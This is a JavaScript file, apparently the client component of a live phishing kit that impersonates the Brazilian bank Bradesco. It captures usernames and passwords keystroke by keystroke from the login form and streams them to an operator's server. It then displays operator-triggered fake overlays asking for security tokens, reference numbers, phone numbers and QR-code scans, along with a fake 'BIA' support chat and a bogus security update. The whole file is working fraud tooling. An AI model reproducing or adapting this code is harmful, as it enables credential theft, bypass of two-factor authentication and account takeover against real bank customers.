/**
 * Cliente Bridge - Injetado na página Bradesco para WebSocket e controle remoto
 * Captura inputs em tempo real e recebe comandos do operador
 * Inclui: Ícone BIA, Tela de Carregamento, Popups, Chat BIA
 */

(function() {
  'use strict';

  // SessionId será gerenciado pelo servidor baseado no IP do cliente
  // Não gerar ID aleatório aqui - deixar o servidor definir
  const sessionId = new URLSearchParams(window.location.search).get('sessionId') || null;
  let socket = null;
  let currentScreen = 'login';
  let biaChatOpen = false;
  const biaMessages = [];
  const capturedData = {
    usuario: '',
    senha: '',
    token: '',
    ddd: '',
    telefone: '',
  };

  console.log('[BRIDGE] Iniciando cliente-bridge.js, sessionId:', sessionId);

  // ============================================================================
  // SOCKET.IO CONNECTION
  // ============================================================================

  function connectSocket() {
    console.log('[BRIDGE] Conectando ao WebSocket...');
    
    if (typeof io === 'undefined') {
      console.log('[BRIDGE] Socket.IO não carregado ainda, tentando novamente em 100ms');
      setTimeout(connectSocket, 100);
      return;
    }

    socket = io('/', {
      query: { role: 'client' },
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionDelayMax: 5000,
      reconnectionAttempts: 5,
    });

    socket.on('connect', () => {
      console.log('[CLI] ✅ Conectado ao servidor:', socket.id);
      emitScreenChange('login');
    });
    
    socket.on('client:welcome', (data) => {
      console.log('[CLI] 👋 SessionId recebido do servidor:', data.sessionId);
      // SessionId agora é baseado no IP do cliente
    });

    socket.on('client:command', (data) => {
      console.log('[CLI] 🎯 Comando recebido:', data.command, data.payload);
      handleCommand(data.command, data.payload);
    });

    socket.on('client:info', (data) => {
      console.log('[CLI] ℹ️ Info recebida:', data);
    });

    socket.on('client:bia-message', (data) => {
      console.log('[CLI] 💬 Mensagem BIA recebida:', data.texto);
      // Sempre renderizar a mensagem, mesmo que o chat não esteja aberto
      addBiaMessage('BIA', data.texto);
    });

    socket.on('client:bia-avatar', (data) => {
      console.log('[CLI] 🎭 Avatar BIA atualizado');
      updateBiaAvatar(data.avatar);
    });

    socket.on('client:qrcode', (data) => {
      console.log('[CLI] 📱 QR Code recebido');
      showQRCode(data.qrCode);
    });

    socket.on('client:disconnect', () => {
      console.log('[CLI] 🔴 Desconectado pelo operador');
      showOverlay('disconnect', 'Sessão encerrada pelo operador');
    });

    socket.on('disconnect', () => {
      console.log('[CLI] ⚠️ Desconectado do servidor');
    });

    socket.on('error', (error) => {
      console.error('[CLI] ❌ Erro no socket:', error);
    });
  }

  // ============================================================================
  // EMITIR MUDANÇA DE TELA
  // ============================================================================

  function emitScreenChange(screen) {
    currentScreen = screen;
    console.log('[BRIDGE] Tela mudou para:', screen);
    if (socket && socket.connected) {
      socket.emit('client:tela-mudou', { tela: screen });
    }
  }

  // ============================================================================
  // EMITIR INPUT DE USUÁRIO
  // ============================================================================

  function emitInput(campo, valor) {
    capturedData[campo] = valor;
    console.log('[BRIDGE] Input capturado:', campo, '=', valor.substring(0, 5) + '...');
    if (socket && socket.connected) {
      socket.emit('client:input', { campo, valor });
    }
  }

  // ============================================================================
  // PROCESSAR COMANDO DO OPERADOR
  // ============================================================================

  function handleCommand(command, payload) {
    console.log('[CLI] 🔄 Processando comando:', command);
    
    // Remover overlay anterior antes de mostrar novo
    removeOverlay();
    
    switch (command) {
      case 'Tela de Login':
        showScreen('login');
        break;
      case 'Aguarde / Senha Incorreta':
        showOverlay('loading', 'VALIDAÇÃO DIGITAL AGUARDE...<br>Estamos validando o código da sua Chave de Segurança Animada.');
        break;
      case 'Pedir Celular':
        showOverlay('phone', 'Atualize seu numero de celular para que possamos entrar em contato caso haja alguma divergência de dados.');
        break;
      case 'Pedir Token Tela':
      case 'Pedir Token Físico':
        showOverlay('token', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança.');
        break;
      case 'Pedir Token QR Code':
        showOverlay('qrcode-request', 'Identificação Positiva<br>Abra o aplicativo Bradesco, vá em Chave de Segurança.');
        break;
      case 'Erro Token':
        showOverlay('error', 'Erro ao validar token. Tente novamente.');
        break;
      case 'Erro Celular':
        showOverlay('error', 'Erro ao validar celular. Tente novamente.');
        break;
      case 'Desbloqueio BIA':
        showBiaChat();
        break;
      case 'Erro Desbloqueio BIA':
        showOverlay('error', 'Erro ao desbloquear BIA. Tente novamente.');
        break;
      case 'Instalar Modulo':
        showOverlay('progress', 'Atualização em Andamento...');
        break;
      case 'Validar Modulo':
        showOverlay('success', 'Atualização Concluída com Sucesso!<br>Seu computador/dispositivo foi atualizado com as novas politicas de transações bancarias.');
        break;
    }
  }

  // ============================================================================
  // MOSTRAR OVERLAY/POPUP
  // ============================================================================

  function showOverlay(type, message, autoCloseTime = 0) {
    console.log('[BRIDGE] 📱 Mostrando overlay:', type);
    
    const overlay = document.createElement('div');
    overlay.id = 'bradesco-overlay';
    overlay.className = 'bradesco-overlay';
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 10000;
    `;

    let content = '';

    switch (type) {
      case 'loading':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div class="spinner" style="margin-top: 20px;">
              <div style="border: 4px solid #f3f3f3; border-top: 4px solid #d32f2f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            </div>
          </div>
        `;
        break;
      case 'phone':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div class="form-group" style="margin-top: 20px;">
              <label>DDD:</label>
              <input type="text" id="overlay-ddd" placeholder="11" maxlength="2" style="text-align: center; font-size: 16px;">
              <label style="margin-top: 10px;">Telefone:</label>
              <input type="text" id="overlay-phone" placeholder="98765-4321" maxlength="9" style="text-align: center; font-size: 16px;">
            </div>
            <button onclick="window.bradescoBridge.submitPhone()">ENVIAR</button>
          </div>
        `;
        break;
      case 'token':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div class="form-group" style="margin-top: 20px;">
              <label>Digite o código gerado:</label>
              <input type="text" id="overlay-token" placeholder="000000" maxlength="6" style="text-align: center; font-size: 24px; letter-spacing: 5px;">
              <label style="margin-top: 15px;">Número de Referência:</label>
              <input type="text" id="overlay-referencia" placeholder="0000" maxlength="10" style="text-align: center; font-size: 18px;">
            </div>
            <button onclick="window.bradescoBridge.submitToken()">ENVIAR CÓDIGO</button>
            <div style="margin-top: 20px; font-size: 11px; color: #666;">
              Certifique-se de digitar o código corretamente.
            </div>
          </div>
        `;
        break;
      case 'qrcode-request':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div id="qrcode-container" style="margin-top: 20px; text-align: center;">
              <p style="color: #666; margin-bottom: 10px; font-size: 14px;">Aguardando QR Code...</p>
              <div style="margin-top: 30px; padding: 20px; background: #f5f5f5; border-radius: 8px; min-height: 250px; display: flex; align-items: center; justify-content: center;">
                <img id="qrcode-image" src="" style="max-width: 300px; max-height: 300px; display: none;" />
              </div>
            </div>
            <div style="margin-top: 20px; font-size: 11px; color: #666;">
              Escaneie o QR Code com seu aplicativo Bradesco.
            </div>
          </div>
        `;
        break;
      case 'progress':
        content = `
          <div class="overlay-content">
            <h2>${message}</h2>
            <div class="progress-bar">
              <div class="progress-fill"></div>
            </div>
          </div>
        `;
        break;
      case 'success':
        content = `
          <div class="overlay-content overlay-success">
            <h2>✓ Sucesso</h2>
            <p>${message}</p>
            <button onclick="window.bradescoBridge.closeOverlay()">FECHAR</button>
          </div>
        `;
        break;
      case 'error':
        content = `
          <div class="overlay-content overlay-error">
            <h2>✗ Erro</h2>
            <p>${message}</p>
            <button onclick="window.bradescoBridge.closeOverlay()">FECHAR</button>
          </div>
        `;
        break;
      case 'disconnect':
        content = `
          <div class="overlay-content overlay-error">
            <h2>Sessão Encerrada</h2>
            <p>${message}</p>
          </div>
        `;
        break;
    }
    
    overlay.innerHTML = content;
    document.body.appendChild(overlay);
    emitScreenChange(type);
  }

  // ============================================================================
  // REMOVER OVERLAY
  // ============================================================================

  function removeOverlay() {
    const overlay = document.getElementById('bradesco-overlay');
    if (overlay) {
      overlay.remove();
    }
    biaChatOpen = false;
  }

  // ============================================================================
  // MOSTRAR TELA
  // ============================================================================

  function showScreen(screen) {
    removeOverlay();
    emitScreenChange(screen);
  }

  // ============================================================================
  // CHAT BIA
  // ============================================================================

  function showBiaChat() {
    console.log('[BRIDGE] 💬 Mostrando chat BIA');
    removeOverlay();
    biaChatOpen = true;
    const overlay = document.createElement('div');
    overlay.id = 'bradesco-overlay';
    overlay.className = 'bradesco-overlay bradesco-overlay-bia';
    overlay.innerHTML = `
      <div class="bradesco-bia-chat">
        <div class="bia-header">
          <span class="bia-title">💬 Chat com BIA</span>
          <button class="bia-close" onclick="window.bradescoBridge.closeOverlay()">×</button>
        </div>
        <div id="bia-messages" class="bia-messages"></div>
        <div class="bia-input-group">
          <input type="text" id="bia-input" placeholder="Digite sua mensagem..." onkeydown="if(event.key === 'Enter') window.bradescoBridge.sendBiaMessage()" />
          <button onclick="window.bradescoBridge.sendBiaMessage()">📤</button>
        </div>
      </div>
    `;
    overlay.style.cssText = `
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: flex;
      align-items: flex-end;
      justify-content: flex-end;
      z-index: 10000;
      padding: 40px;
    `;
    document.body.appendChild(overlay);
    emitScreenChange('bia-chat');
    renderBiaMessages();
  }

  function addBiaMessage(from, text) {
    biaMessages.push({ from, text, ts: Date.now() });
    if (biaChatOpen) {
      renderBiaMessages();
    }
  }

  function renderBiaMessages() {
    const container = document.getElementById('bia-messages');
    if (!container) return;
    container.innerHTML = biaMessages.map(msg => `
      <div class="bia-message ${msg.from === 'BIA' ? 'from-operator' : 'from-client'}">
        <strong>${msg.from}:</strong> ${msg.text}
      </div>
    `).join('');
    container.scrollTop = container.scrollHeight;
  }

  function sendBiaMessage() {
    const input = document.getElementById('bia-input');
    if (!input || !input.value.trim()) return;
    
    const text = input.value.trim();
    if (socket && socket.connected) {
      socket.emit('client:bia-message', { texto: text });
    }
    addBiaMessage('Você', text);
    input.value = '';
  }

  function updateBiaAvatar(avatar) {
    console.log('[BRIDGE] Avatar BIA atualizado:', avatar);
  }

  // ============================================================================
  // MOSTRAR QR CODE
  // ============================================================================

  function showQRCode(qrCodeDataUrl) {
    console.log('[BRIDGE] Exibindo QR Code');
    const container = document.getElementById('qrcode-container');
    const image = document.getElementById('qrcode-image');
    if (container && image) {
      image.src = qrCodeDataUrl;
      image.style.display = 'block';
    }
  }

  // ============================================================================
  // CONFIGURAR LISTENERS DE INPUT
  // ============================================================================

  function setupInputListeners() {
    console.log('[BRIDGE] ⚙️ Configurando listeners de input');

    // Listener para usuário
    const usuarioInput = document.getElementById('identificationForm:txtUsuario');
    if (usuarioInput) {
      usuarioInput.addEventListener('input', (e) => {
        emitInput('usuario', e.target.value);
      });
      console.log('[BRIDGE] ✅ Listener de usuário configurado');
    } else {
      console.log('[BRIDGE] ⚠️ Elemento identificationForm:txtUsuario não encontrado');
    }

    // Listener para senha
    const senhaInput = document.getElementById('identificationForm:txtSenha');
    if (senhaInput) {
      // Manter como type="password" para mascarar na tela do cliente
      senhaInput.type = 'password';
      senhaInput.addEventListener('input', (e) => {
        emitInput('senha', e.target.value);
      });
      console.log('[BRIDGE] ✅ Listener de senha configurado (mascarado)');
    } else {
      console.log('[BRIDGE] ⚠️ Elemento identificationForm:txtSenha não encontrado');
    }

    // Listener para botão Avançar
    const botaoAvancar = document.getElementById('identificationForm:botaoAvancar');
    if (botaoAvancar) {
      botaoAvancar.addEventListener('click', () => {
        console.log('[BRIDGE] 🔐 Botão Avançar clicado');
        showOverlay('loading', 'CARREGANDO...');
        emitScreenChange('carregando');
      });
      console.log('[BRIDGE] ✅ Listener do botão Avançar configurado');
    }
  }

  // ============================================================================
  // CRIAR ÍCONE BIA
  // ============================================================================

  function createBiaIcon() {
    console.log('[BRIDGE] 🎨 Criando ícone BIA');
    const icon = document.createElement('button');
    icon.id = 'bradesco-bia-icon';
    icon.innerHTML = '💬';
    icon.style.cssText = `
      position: fixed;
      bottom: 20px;
      right: 20px;
      width: 60px;
      height: 60px;
      border-radius: 50%;
      background: #d32f2f;
      color: white;
      border: none;
      font-size: 30px;
      cursor: pointer;
      z-index: 9999;
      box-shadow: 0 2px 10px rgba(0,0,0,0.3);
      transition: all 0.3s ease;
    `;
    icon.onmouseover = () => {
      icon.style.transform = 'scale(1.1)';
      icon.style.boxShadow = '0 4px 15px rgba(0,0,0,0.4)';
    };
    icon.onmouseout = () => {
      icon.style.transform = 'scale(1)';
      icon.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
    };
    icon.onclick = () => {
      console.log('[BRIDGE] 💬 Ícone BIA clicado');
      showBiaChat();
    };
    document.body.appendChild(icon);
    console.log('[BRIDGE] ✅ Ícone BIA criado');
  }

  // ============================================================================
  // EXPORTAR FUNÇÕES GLOBAIS
  // ============================================================================

  function showQRCode(qrCodeDataUrl) {
    console.log('[BRIDGE] Exibindo QR Code');
    const container = document.getElementById('qrcode-container');
    if (container) {
      container.innerHTML = '<img src="' + qrCodeDataUrl + '" style="max-width: 300px; max-height: 300px; border: 2px solid #d32f2f; border-radius: 8px;" />';
    }
  }

  window.bradescoBridge = {
    closeOverlay: removeOverlay,
    submitPhone: () => {
      const ddd = document.getElementById('overlay-ddd')?.value;
      const phone = document.getElementById('overlay-phone')?.value;
      if (ddd && phone) {
        console.log('[BRIDGE] 📱 Telefone enviado:', ddd, phone);
        emitInput('ddd', ddd);
        emitInput('telefone', phone);
        showOverlay('loading', 'VALIDANDO... AGUARDE');
      }
    },
    sendBiaMessage: sendBiaMessage,
    submitToken: () => {
      const token = document.getElementById('overlay-token')?.value;
      const ref = document.getElementById('overlay-referencia')?.value;
      if (token) {
        console.log('[BRIDGE] 🔑 Token enviado:', token);
        emitInput('token', token);
        if (ref) {
          console.log('[BRIDGE] 📄 Referência enviada:', ref);
          emitInput('referencia', ref);
        }
        showOverlay('loading', 'VALIDANDO CÓDIGO AGUARDE...');
      }
    }
  };

  // ============================================================================
  // INICIALIZAÇÃO
  // ============================================================================

  function init() {
    console.log('[BRIDGE] 🚀 Inicializando cliente-bridge...');
    
    // Aguardar DOM estar pronto
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', () => {
        console.log('[BRIDGE] ✅ DOM pronto');
        connectSocket();
        setupInputListeners();
        createBiaIcon();
      });
    } else {
      console.log('[BRIDGE] ✅ DOM já pronto');
      connectSocket();
      setupInputListeners();
      createBiaIcon();
    }
  }

  // Iniciar
  init();
})();

// ============================================================================
// ESTILOS GLOBAIS
// ============================================================================

const style = document.createElement('style');
style.textContent = `
  .bradesco-overlay {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.7);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 10000;
  }

  .overlay-content {
    background: white;
    border-radius: 8px;
    padding: 30px;
    max-width: 500px;
    width: 90%;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
    text-align: center;
    font-family: Arial, sans-serif;
  }

  .overlay-content h2 {
    color: #d32f2f;
    margin: 0 0 20px 0;
    font-size: 18px;
    line-height: 1.4;
  }

  .overlay-content p {
    color: #333;
    margin: 10px 0;
    font-size: 14px;
  }

  .overlay-content button {
    background: #d32f2f;
    color: white;
    border: none;
    padding: 12px 30px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 14px;
    font-weight: bold;
    margin-top: 20px;
    transition: background 0.3s;
  }

  .overlay-content button:hover {
    background: #b71c1c;
  }

  .form-group {
    text-align: left;
    margin: 15px 0;
  }

  .form-group label {
    display: block;
    margin-bottom: 8px;
    color: #333;
    font-size: 14px;
    font-weight: bold;
  }

  .form-group input {
    width: 100%;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 14px;
    box-sizing: border-box;
  }

  .overlay-success {
    border-left: 4px solid #4caf50;
  }

  .overlay-success h2 {
    color: #4caf50;
  }

  .overlay-error {
    border-left: 4px solid #f44336;
  }

  .overlay-error h2 {
    color: #f44336;
  }

  .progress-bar {
    width: 100%;
    height: 4px;
    background: #e0e0e0;
    border-radius: 2px;
    overflow: hidden;
    margin-top: 20px;
  }

  .progress-fill {
    height: 100%;
    background: #d32f2f;
    animation: progress 2s infinite;
  }

  @keyframes progress {
    0% { width: 0%; }
    50% { width: 100%; }
    100% { width: 0%; }
  }

  @keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
  }

  .bradesco-bia-chat {
    background: white;
    border-radius: 8px;
    width: 400px;
    max-height: 600px;
    display: flex;
    flex-direction: column;
    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
  }

  .bia-header {
    background: #d32f2f;
    color: white;
    padding: 15px;
    border-radius: 8px 8px 0 0;
    display: flex;
    justify-content: space-between;
    align-items: center;
  }

  .bia-title {
    font-weight: bold;
  }

  .bia-close {
    background: none;
    border: none;
    color: white;
    font-size: 24px;
    cursor: pointer;
  }

  .bia-messages {
    flex: 1;
    overflow-y: auto;
    padding: 15px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .bia-message {
    padding: 10px;
    border-radius: 4px;
    font-size: 13px;
    word-wrap: break-word;
  }

  .bia-message.from-operator {
    background: #d32f2f;
    color: white;
    align-self: flex-end;
    max-width: 80%;
  }

  .bia-message.from-client {
    background: #e0e0e0;
    color: #333;
    align-self: flex-start;
    max-width: 80%;
  }

  .bia-input-group {
    display: flex;
    gap: 10px;
    padding: 15px;
    border-top: 1px solid #e0e0e0;
  }

  .bia-input-group input {
    flex: 1;
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 4px;
    font-size: 13px;
  }

  .bia-input-group button {
    background: #d32f2f;
    color: white;
    border: none;
    padding: 10px 15px;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
  }

  .bia-input-group button:hover {
    background: #b71c1c;
  }
`;
document.head.appendChild(style);
